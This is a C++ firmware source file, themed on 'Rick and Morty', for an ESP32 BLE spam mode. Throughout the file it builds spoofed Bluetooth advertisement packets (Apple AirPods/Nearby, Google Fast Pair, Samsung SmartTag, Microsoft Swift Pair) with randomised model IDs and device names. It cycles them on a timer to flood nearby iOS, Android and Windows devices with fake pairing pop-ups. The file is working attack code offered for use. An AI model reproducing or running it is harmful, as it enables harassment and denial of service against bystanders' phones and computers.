/**
 * @file ble_spam.cpp
 * @brief BLE Spam - Get Schwifty Mode Implementation
 *
 * "Show me what you got!" - Giant Heads
 */

#include "ble_spam.h"
#include <NimBLEDevice.h>
#include <NimBLEAdvertising.h>

// BLE Advertising instance
static NimBLEAdvertising* pAdvertising = nullptr;

// Random device names for spam
static const char* SCHWIFTY_NAMES[] = {
    "AirPods Pro",
    "Galaxy Buds",
    "Beats Studio",
    "Sony WH-1000",
    "JBL Tune",
    "Bose QC",
    "Pixel Buds",
    "SmartTag",
    "AirTag",
    "Rick's Portal",
    "Plumbus BT",
    "Meeseeks",
    "Schwifty",
    "Portal Gun"
};

// =============================================================================
// INITIALIZATION
// =============================================================================
bool ble_spam_init(ble_spam_state_t* state) {
    state->target = BLE_TARGET_ALL;
    state->isSpamming = false;
    state->spamCount = 0;
    state->lastSpamTime = 0;
    state->spamInterval = BLE_SPAM_INTERVAL_MS;
    state->currentPayload = 0;
    state->randomize = true;

    // Get advertising instance
    pAdvertising = NimBLEDevice::getAdvertising();

    Serial.println("[BLE] Get Schwifty mode initialized");
    return true;
}

// =============================================================================
// START/STOP SPAM
// =============================================================================
void ble_spam_start(ble_spam_state_t* state, ble_target_t target) {
    state->target = target;
    state->isSpamming = true;
    state->spamCount = 0;
    state->lastSpamTime = millis();

    const char* targetName;
    switch (target) {
        case BLE_TARGET_APPLE:   targetName = "Apple"; break;
        case BLE_TARGET_ANDROID: targetName = "Android"; break;
        case BLE_TARGET_SAMSUNG: targetName = "Samsung"; break;
        case BLE_TARGET_WINDOWS: targetName = "Windows"; break;
        default:                 targetName = "ALL"; break;
    }

    Serial.printf("[BLE] GET SCHWIFTY! Spamming %s devices...\n", targetName);
}

void ble_spam_stop(ble_spam_state_t* state) {
    state->isSpamming = false;
    pAdvertising->stop();
    Serial.printf("[BLE] Schwifty stopped. Total spam: %d\n", state->spamCount);
}

void ble_spam_set_interval(ble_spam_state_t* state, uint16_t ms) {
    state->spamInterval = ms;
}

void ble_spam_set_randomize(ble_spam_state_t* state, bool enabled) {
    state->randomize = enabled;
}

// =============================================================================
// SPAM TICK (CALL IN LOOP)
// =============================================================================
void ble_spam_tick(ble_spam_state_t* state) {
    if (!state->isSpamming) return;

    if (millis() - state->lastSpamTime < state->spamInterval) return;

    state->lastSpamTime = millis();

    // Send spam based on target
    switch (state->target) {
        case BLE_TARGET_APPLE:
            ble_spam_apple(state);
            break;
        case BLE_TARGET_ANDROID:
            ble_spam_android(state);
            break;
        case BLE_TARGET_SAMSUNG:
            ble_spam_samsung(state);
            break;
        case BLE_TARGET_WINDOWS:
            ble_spam_windows(state);
            break;
        case BLE_TARGET_ALL:
        default:
            ble_spam_all(state);
            break;
    }

    state->spamCount++;

    // Log every 100 spam
    if (state->spamCount % 100 == 0) {
        Serial.printf("[BLE] Schwifty count: %d\n", state->spamCount);
    }
}

uint32_t ble_spam_get_count(ble_spam_state_t* state) {
    return state->spamCount;
}

// =============================================================================
// APPLE SPAM (AirPods/AirDrop popup)
// =============================================================================
void ble_spam_apple(ble_spam_state_t* state) {
    pAdvertising->stop();

    // Apple Nearby Info (AirPods popup)
    // Format: Length, Type, Company (Apple), Type (Nearby), Data
    uint8_t appleData[31];
    uint8_t dataLen = 0;

    // Flags
    appleData[dataLen++] = 0x02;  // Length
    appleData[dataLen++] = 0x01;  // Flags type
    appleData[dataLen++] = 0x06;  // LE General + BR/EDR Not Supported

    // Apple Manufacturer Data
    appleData[dataLen++] = 0x1A;  // Length (26 bytes)
    appleData[dataLen++] = 0xFF;  // Manufacturer Specific
    appleData[dataLen++] = 0x4C;  // Apple (0x004C)
    appleData[dataLen++] = 0x00;

    // Nearby Info Type
    appleData[dataLen++] = 0x07;  // Type: Nearby
    appleData[dataLen++] = 0x19;  // Length
    appleData[dataLen++] = 0x07;  // AirPods

    // Random model for variety
    uint8_t models[] = {0x0E, 0x14, 0x02, 0x0F, 0x13};
    appleData[dataLen++] = models[random(0, 5)];

    // Status and battery
    appleData[dataLen++] = 0x20 | random(0, 16);  // Status + random charge
    appleData[dataLen++] = random(50, 100);        // Left bud battery
    appleData[dataLen++] = 0xAA;
    appleData[dataLen++] = random(50, 100);        // Right bud battery

    // Fill rest with random
    while (dataLen < 27) {
        appleData[dataLen++] = random(0, 256);
    }

    NimBLEAdvertisementData advData;
    advData.addData(appleData, dataLen);

    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
}

// =============================================================================
// ANDROID SPAM (Google Fast Pair)
// =============================================================================
void ble_spam_android(ble_spam_state_t* state) {
    pAdvertising->stop();

    // Google Fast Pair Service Data
    uint8_t fastPairData[31];
    uint8_t dataLen = 0;

    // Flags
    fastPairData[dataLen++] = 0x02;
    fastPairData[dataLen++] = 0x01;
    fastPairData[dataLen++] = 0x06;

    // Fast Pair Service Data
    fastPairData[dataLen++] = 0x06;  // Length
    fastPairData[dataLen++] = 0x16;  // Service Data type
    fastPairData[dataLen++] = 0x2C;  // Fast Pair UUID (0xFE2C)
    fastPairData[dataLen++] = 0xFE;

    // Random Model ID
    uint32_t modelIds[] = {0x000000, 0x00000A, 0x000011, 0x00002A, 0x000041};
    uint32_t modelId = modelIds[random(0, 5)];

    fastPairData[dataLen++] = (modelId >> 16) & 0xFF;
    fastPairData[dataLen++] = (modelId >> 8) & 0xFF;
    fastPairData[dataLen++] = modelId & 0xFF;

    // TX Power
    fastPairData[dataLen++] = 0x02;
    fastPairData[dataLen++] = 0x0A;
    fastPairData[dataLen++] = 0x00;

    NimBLEAdvertisementData advData;
    advData.addData(fastPairData, dataLen);

    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
}

// =============================================================================
// SAMSUNG SPAM (SmartTag)
// =============================================================================
void ble_spam_samsung(ble_spam_state_t* state) {
    pAdvertising->stop();

    uint8_t samsungData[31];
    uint8_t dataLen = 0;

    // Flags
    samsungData[dataLen++] = 0x02;
    samsungData[dataLen++] = 0x01;
    samsungData[dataLen++] = 0x06;

    // Samsung Manufacturer Data
    samsungData[dataLen++] = 0x0F;  // Length
    samsungData[dataLen++] = 0xFF;  // Manufacturer Specific
    samsungData[dataLen++] = 0x75;  // Samsung (0x0075)
    samsungData[dataLen++] = 0x00;

    samsungData[dataLen++] = 0x01;
    samsungData[dataLen++] = 0x00;
    samsungData[dataLen++] = 0x02;
    samsungData[dataLen++] = 0x00;
    samsungData[dataLen++] = 0x01;
    samsungData[dataLen++] = 0x01;
    samsungData[dataLen++] = 0xFF;
    samsungData[dataLen++] = 0x00;
    samsungData[dataLen++] = 0x00;
    samsungData[dataLen++] = 0x43;

    // Random bytes
    for (int i = 0; i < 2; i++) {
        samsungData[dataLen++] = random(0, 256);
    }

    NimBLEAdvertisementData advData;
    advData.addData(samsungData, dataLen);

    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
}

// =============================================================================
// WINDOWS SPAM (Swift Pair)
// =============================================================================
void ble_spam_windows(ble_spam_state_t* state) {
    pAdvertising->stop();

    uint8_t windowsData[31];
    uint8_t dataLen = 0;

    // Flags
    windowsData[dataLen++] = 0x02;
    windowsData[dataLen++] = 0x01;
    windowsData[dataLen++] = 0x06;

    // Microsoft Swift Pair
    windowsData[dataLen++] = 0x06;  // Length
    windowsData[dataLen++] = 0xFF;  // Manufacturer Specific
    windowsData[dataLen++] = 0x06;  // Microsoft (0x0006)
    windowsData[dataLen++] = 0x00;
    windowsData[dataLen++] = 0x03;  // Swift Pair
    windowsData[dataLen++] = 0x00;
    windowsData[dataLen++] = 0x80;  // Show notification

    // Random device name
    const char* name = SCHWIFTY_NAMES[random(0, 14)];
    uint8_t nameLen = strlen(name);

    windowsData[dataLen++] = nameLen + 1;
    windowsData[dataLen++] = 0x09;  // Complete Local Name
    memcpy(&windowsData[dataLen], name, nameLen);
    dataLen += nameLen;

    NimBLEAdvertisementData advData;
    advData.addData(windowsData, dataLen);

    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
}

// =============================================================================
// SPAM ALL TARGETS
// =============================================================================
void ble_spam_all(ble_spam_state_t* state) {
    // Rotate through all targets
    switch (state->currentPayload % 4) {
        case 0: ble_spam_apple(state); break;
        case 1: ble_spam_android(state); break;
        case 2: ble_spam_samsung(state); break;
        case 3: ble_spam_windows(state); break;
    }
    state->currentPayload++;
}

// =============================================================================
// HELPERS
// =============================================================================
void ble_generate_random_payload(uint8_t* payload, uint8_t len) {
    for (uint8_t i = 0; i < len; i++) {
        payload[i] = random(0, 256);
    }
}

void ble_set_power(int8_t power) {
    esp_power_level_t level;
    if (power >= 9) level = ESP_PWR_LVL_P9;
    else if (power >= 6) level = ESP_PWR_LVL_P6;
    else if (power >= 3) level = ESP_PWR_LVL_P3;
    else level = ESP_PWR_LVL_N0;

    NimBLEDevice::setPower(level);
}

const char* ble_get_random_name() {
    return SCHWIFTY_NAMES[random(0, 14)];
}
